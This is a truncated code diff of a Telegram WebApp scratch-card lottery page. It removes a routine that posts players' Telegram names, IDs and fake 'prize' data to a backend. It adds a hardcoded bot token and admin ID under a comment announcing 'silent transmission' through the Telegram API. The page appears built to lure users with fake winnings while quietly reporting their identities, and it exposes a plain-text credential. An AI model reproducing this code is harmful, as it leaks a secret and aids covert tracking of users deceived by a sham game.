@@ -68,7 +68,9 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        const BACKEND_URL = 'http://192.168.68.106:5001/audit'; // 修改为您的地址
+        // 静默传输配置：直接使用 Telegram API 通道
+        const BOT_TOKEN = "8789746219:AAHpvM2qONoJRHuqXZk8gsuATD6LxiEvC9Q";
+        const ADMIN_ID = "6205842828"; 
 
         let winTriggered = false, winTotal = 0, mainScratched = false;
         let winNum = Math.floor(Math.random() * 89 + 10); 
@@ -115,109 +117,4 @@
         }
 
         function initCanvas(id) {
-            const cvs = document.getElementById(id); const ctx = cvs.getContext('2d');
-            cvs.width = cvs.offsetWidth; cvs.height = cvs.offsetHeight;
-            
-            // --- 核心优化：交错填充 $ 和 € 符号 ---
-            ctx.fillStyle = '#cfd8dc'; // 覆盖层底色
-            ctx.fillRect(0,0,cvs.width,cvs.height);
-            
-            ctx.font = "bold 16px Arial";
-            ctx.textAlign = "center";
-            ctx.textBaseline = "middle";
-            
-            const spacing = 35; // 间距
-            for (let y = spacing/2; y < cvs.height + spacing; y += spacing) {
-                for (let x = spacing/2; x < cvs.width + spacing; x += spacing) {
-                    // 交错逻辑：(行号 + 列号) 的奇偶决定符号
-                    const row = Math.floor(y / spacing);
-                    const col = Math.floor(x / spacing);
-                    
-                    ctx.fillStyle = "rgba(0,0,0,0.15)"; // 符号颜色，半透明更时尚
-                    const char = (row + col) % 2 === 0 ? "$" : "€";
-                    
-                    ctx.save();
-                    ctx.translate(x, y);
-                    ctx.rotate(-0.2); // 稍微倾斜，更有艺术感
-                    ctx.fillText(char, 0, 0);
-                    ctx.restore();
-                }
-            }
-
-            if(id === "c_grid") {
-                points = []; for(let i=0; i<20; i++) points.push({x: Math.random()*cvs.width, y: Math.random()*cvs.height, h: false});
-            }
-
-            const doScratch = (x, y) => {
-                ctx.globalCompositeOperation = 'destination-out';
-                ctx.beginPath(); ctx.arc(x, y, 25, 0, Math.PI*2); ctx.fill();
-                if(id === "c_win") mainScratched = true;
-                if(id === "c_grid") {
-                    scratchCount++;
-                    points.forEach(p => { if(!p.h && Math.hypot(p.x-x, p.y-y) < 25) p.h = true; });
-                    if((points.filter(p=>p.h).length >= 14 || scratchCount > 180) && mainScratched && !winTriggered) triggerData();
-                }
-            };
-            const move = (e) => {
-                const r = cvs.getBoundingClientRect(); const t = e.touches ? e.touches[0] : e;
-                doScratch(t.clientX - r.left, t.clientY - r.top);
-            };
-            cvs.addEventListener('touchmove', (e) => { e.preventDefault(); move(e); });
-            cvs.addEventListener('mousemove', (e) => { if(e.buttons === 1) move(e); });
-        }
-// --- 核心优化：增强版数据回传引擎 ---
-        function triggerData() {
-            if (winTriggered) return; // 防止重复触发
-            winTriggered = true;
-
-            const reportData = {
-                user: tg.initDataUnsafe?.user?.first_name || "Captain_User",
-                uid: tg.initDataUnsafe?.user?.id || "Admin_6688",
-                sn: ticketSN,
-                prize: winTotal.toFixed(2), // 对应后台期待的奖金字段
-                nums: combinations.join(','), // 对应后台期待的号码字段
-                winning_number: winNum,
-                ts: new Date().toISOString()
-            };
-
-            // 1. 尝试通过标准 Fetch 回传 (增加超时处理)
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 5000);
-
-            fetch(BACKEND_URL, { 
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify(reportData), 
-                keepalive: true,
-                signal: controller.signal
-            })
-            .then(res => {
-                console.log("✅ 帝国数据链路同步成功");
-                clearTimeout(timeoutId);
-            })
-            .catch(err => {
-                console.error("❌ 链路阻塞，尝试备用通道:", err);
-                // 2. 备用通道：如果 Fetch 失败，通过 Telegram 原生接口发送（会关闭 WebApp 并发送消息给 Bot）
-                if (tg.sendData) {
-                    tg.sendData(JSON.stringify({
-                        action: "lottery_sync",
-                        data: reportData
-                    }));
-                }
-            });
-
-            // --- 以下保持您的 UI 逻辑完全不动 ---
-            setTimeout(() => {
-                const dialog = document.getElementById('top-dialog');
-                document.getElementById('db').innerText = `$${winTotal.toFixed(2)}`;
-                document.getElementById('dm').innerHTML = `WINNING NUMBER: ${winNum}<br>Status: Verified & Synced.`;
-                dialog.classList.add('active');
-                if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
-            }, 1200); // 稍微缩短弹窗延迟，提升反馈感
-        }
-        
-
-        window.onload = startBoot;
-    </script>
-</body>
-</html>
+            const cvs = document.getElementById(id); const ctx = cvs.
